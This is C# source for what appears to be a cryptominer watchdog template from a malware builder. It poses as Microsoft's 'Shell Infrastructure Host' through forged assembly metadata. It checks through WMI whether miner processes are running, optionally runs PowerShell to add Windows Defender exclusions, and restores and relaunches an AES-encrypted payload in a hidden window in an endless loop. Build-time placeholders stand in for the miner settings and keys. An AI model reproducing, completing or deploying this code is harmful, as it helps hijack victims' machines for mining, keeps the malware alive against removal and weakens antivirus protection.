using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Reflection;
using System.Security.Principal;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
#if DefDebug
using System.Windows.Forms;
#endif

[assembly: AssemblyTitle("Shell Infrastructure Host")]
[assembly: AssemblyDescription("Shell Infrastructure Host")]
[assembly: AssemblyProduct("Microsoft® Windows® Operating System")]
[assembly: AssemblyCopyright("© Microsoft Corporation. All Rights Reserved.")]
[assembly: AssemblyFileVersion("10.0.19041.746")]

public partial class _rProgram_
{
    public static byte[] _rxm_ = { };
    public static int _rcheckcount_ = 0;
    public static string _rplp_ = PayloadPath;

    public static void Main()
    {
        try
        {
            _rxm_ = _rAESMethod_(File.ReadAllBytes(_rplp_), true);
            _rWDLoop_();
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W1: " + Environment.NewLine + ex.ToString());
#endif
            Environment.Exit(0);
        }
    }

    public static void _rWDLoop_()
    {
        try
        {
            string _rarg1_ = "";
            var _rarg4_ = new ConnectionOptions();
            _rarg4_.Impersonation = ImpersonationLevel.Impersonate;
            var _rarg5_ = new ManagementScope("#WMISCOPE", _rarg4_);
            _rarg5_.Connect();

            var rarg6 = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#GPUQUERY")).Get();
            foreach (ManagementObject MemObj in rarg6)
            {
                _rarg1_ += (" " + MemObj["#STRVIDEOP"] + " " + MemObj["#STRNAME"]);
            }

            bool _rarg2_ = _rarg1_.IndexOf("#STRNVIDIA", StringComparison.OrdinalIgnoreCase) >= 0 || _rarg1_.IndexOf("#STRAMD", StringComparison.OrdinalIgnoreCase) >= 0;

            string _rminers_ = "";
            var _rarg7_ = new ManagementObjectSearcher(_rarg5_, new ObjectQuery("#MINERQUERY")).Get();
            foreach (ManagementObject retObject in _rarg7_)
            {
                if (retObject != null && retObject["#STRCMDLINE"] != null && retObject["#STRCMDLINE"].ToString().Contains("#MINERID"))
                {
                    _rminers_ += retObject["#STRCMDLINE"].ToString();
                }
            }

            string[][] _rminerset_ = new string[][] { MINERSET };
            bool _rmissing_ = false;
            foreach (string[] _set_ in _rminerset_)
            {
                if(!_rminers_.Contains(_set_[0]) && (_set_[1] == "#XID" || (_set_[1] == "#EID" && _rarg2_)))
                {
                    _rmissing_ = true;
                    break;
                }
            }

            bool _rexists_ = File.Exists(_rplp_);
            if (!_rexists_ || _rmissing_)
            {
                if (!_rexists_ || _rcheckcount_ > 2)
                {
                    _rcheckcount_ = 0;
#if DefWDExclusions
                    try
                    {
                        _rCommand_("#SPOWERSHELL", "#WDCOMMANDS");
                    }
                    catch (Exception ex)
                    {
#if DefDebug
                    MessageBox.Show("W2.5: " + Environment.NewLine + ex.ToString());
#endif
                    }
#endif
                    string _rpath_ = _rplp_;
                    if (!_rexists_)
                    {
                        _rpath_ = Path.Combine(Path.GetTempPath(), "#STRRNDPATH");
                        Directory.CreateDirectory(Path.GetDirectoryName(_rpath_));
                        File.WriteAllBytes(_rpath_, _rAESMethod_(_rxm_));
                    }
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = _rpath_,
                        WorkingDirectory = Path.GetDirectoryName(_rpath_),
                        WindowStyle = ProcessWindowStyle.Hidden,
                        CreateNoWindow = true
                    });
                }
                else
                {
                    _rcheckcount_ += 1;
                }

            }
        }
        catch (Exception ex)
        {
#if DefDebug
            MessageBox.Show("W2: " + Environment.NewLine + ex.ToString());
#endif
        }
        Thread.Sleep(startDelay * 1000 + 20000);
        _rWDLoop_();
    }

#if DefObfuscate
    public static string _rGetString_(string _rarg1_)
    {
        return Encoding.UTF8.GetString(_rAESMethod_(Convert.FromBase64String(_rarg1_)));
    }
#endif

    public static byte[] _rAESMethod_(byte[] _rinput_, bool _rencrypt_ = false)
    {
#if DefObfuscate
        var _rkeybytes_ = new Rfc2898DeriveBytes(@"#AESKEY", Encoding.ASCII.GetBytes(@"#SALT"), 100).GetBytes(16);
        using (Aes _raesAlg_ = Aes.Create())
        {
            using (MemoryStream _rmsDecrypt_ = new MemoryStream())
            {
                using (CryptoStream _rcsDecrypt_ = new CryptoStream(_rmsDecrypt_, _rencrypt_ ? _raesAlg_.CreateEncryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")) : _raesAlg_.CreateDecryptor(_rkeybytes_, Encoding.ASCII.GetBytes(@"#IV")), CryptoStreamMode.Write))
                {
                    _rcsDecrypt_.Write(_rinput_, 0, _rinput_.Length);
                    _rcsDecrypt_.Close();
                }
                return _rmsDecrypt_.ToArray();
            }
        }
#else
        return _rinput_;
#endif
    }

    public static void _rCommand_(string _rarg1_, string _rarg2_)
    {
        try
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = _rarg1_,
                Arguments = _rarg2_,
                WorkingDirectory = Environment.SystemDirectory,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true
            }).WaitForExit();
        }
        catch (Exception ex)
        {
#if DefDebug
                MessageBox.Show("M.C: " + Environment.NewLine + ex.ToString());
#endif
        }
    }
}